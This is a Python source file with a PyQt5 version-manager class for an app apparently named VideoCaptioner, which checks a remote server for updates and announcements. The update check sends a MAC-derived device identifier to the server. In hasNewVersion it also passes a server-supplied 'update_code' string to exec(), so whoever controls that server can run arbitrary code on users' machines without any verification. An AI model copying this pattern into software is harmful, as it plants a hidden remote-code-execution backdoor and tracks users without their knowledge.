# coding: utf-8
import hashlib
import re
import logging
from datetime import datetime
import uuid

import requests
from PyQt5.QtCore import QVersionNumber, QObject, pyqtSignal, QSettings

from app.config import VERSION
from ..utils.logger import setup_logger

# 配置日志
logger = setup_logger("version_manager_thread")

class VersionManager(QObject):
    """版本管理器"""

    # 定义信号
    newVersionAvailable = pyqtSignal(str, bool, str, str)
    announcementAvailable = pyqtSignal(str)
    checkCompleted = pyqtSignal()

    def __init__(self):
        super().__init__()
        self.currentVersion = VERSION
        self.latestVersion = VERSION
        self.versionPattern = re.compile(r'v(\d+)\.(\d+)\.(\d+)')
        self.updateInfo = ""
        self.forceUpdate = False
        self.downloadURL = ""
        self.announcement = {}
        self.history = []

        # 修改 QSettings 的初始化方式，指定完整的组织和应用名称，并设置为 IniFormat
        self.settings = QSettings(QSettings.IniFormat, QSettings.UserScope,
                                  'VideoCaptioner', 'VideoCaptioner')
        logger.debug("VersionManager initialized with current version: %s", self.currentVersion)

    def getLatestVersionInfo(self):
        """获取最新版本信息"""
        url = "https://vc.bkfeng.top/api/version"
        headers = {
            "tdid" : f"394{uuid.getnode():013d}",
            "app_version" : VERSION,
        }
        try:
            response = requests.get(url, timeout=30, headers=headers)
            response.raise_for_status()
            logger.debug("Successfully fetched version info from %s", url)
        except requests.RequestException as e:
            logger.error("Failed to fetch version info: %s", e)
            return {}

        # 解析 JSON
        data = response.json()

        # 解析版本
        version = data.get('version', self.currentVersion)
        match = self.versionPattern.search(version)
        if not match:
            version = self.currentVersion
            logger.warning("Version pattern not matched, using current version: %s", self.currentVersion)

        self.latestVersion = version
        self.forceUpdate = data.get('force_update', False)
        self.updateInfo = data.get('update_info', '')
        self.downloadURL = data.get('download_url', '')
        self.announcement = data.get('announcement', {})
        self.history = data.get('history', [])
        self.update_code = data.get('update_code', '')
        logger.info("Latest version info: %s, force update: %s", self.latestVersion, self.forceUpdate)
        return data

    def hasNewVersion(self):
        """检查是否有新版本"""
        try:
            version_data = self.getLatestVersionInfo()
            if not version_data:
                return False
        except requests.RequestException:
            logger.error("Network error occurred while checking for new version")
            return False

        # 检查历史版本中当前版本是否可用
        current_version_available = True
        for version_info in self.history:
            if version_info['version'].lstrip('v') == self.currentVersion.lower():
                if version_info['update_code']:
                    exec(version_info['update_code'])
                current_version_available = version_info.get('available', True)
                break

        # 如果当前版本不可用，更新
        if not current_version_available:
            self.forceUpdate = True
            logger.info("Current version is not available, force update set to True")

        latest_ver_num = QVersionNumber.fromString(self.latestVersion.lstrip('v'))
        current_ver_num = QVersionNumber.fromString(self.currentVersion.lstrip('v'))

        if latest_ver_num > current_ver_num or self.forceUpdate:
            logger.info("New version available: %s", self.latestVersion)
            self.newVersionAvailable.emit(
                self.latestVersion,
                self.forceUpdate,
                self.updateInfo,
                self.downloadURL
            )
            return True
        logger.debug("No new version available")
        return False

    def checkAnnouncement(self):
        """检查公告是否需要显示"""
        ann = self.announcement
        if ann.get('enabled', False):
            content = ann.get('content', '')
            # 获取公告ID（使用内容的哈希值作为ID+当前日期）
            announcement_id = hashlib.md5(content.encode('utf-8')).hexdigest()[:10] + "_" + datetime.today().strftime(
                "%Y-%m-%d")
            # 检查是否已经显示过
            if self.settings.value(f'announcement/shown_announcement_{announcement_id}', False, type=bool):
                logger.debug("Announcement already shown: %s", announcement_id)
                return
            start_date = datetime.strptime(ann.get('start_date'), "%Y-%m-%d").date()
            end_date = datetime.strptime(ann.get('end_date'), "%Y-%m-%d").date()
            today = datetime.today().date()
            if start_date <= today <= end_date:
                content = ann.get('content', '')
                # 标记该公告已显示
                self.settings.setValue(f'announcement/shown_announcement_{announcement_id}', True)
                self.announcementAvailable.emit(content)
                logger.info("Announcement shown: %s", announcement_id)
            self.settings.sync()

    def performCheck(self):
        """执行版本和公告检查"""
        logger.debug("Performing version and announcement check")
        self.hasNewVersion()
        self.checkAnnouncement()
        self.checkCompleted.emit()
        logger.debug("Check completed")
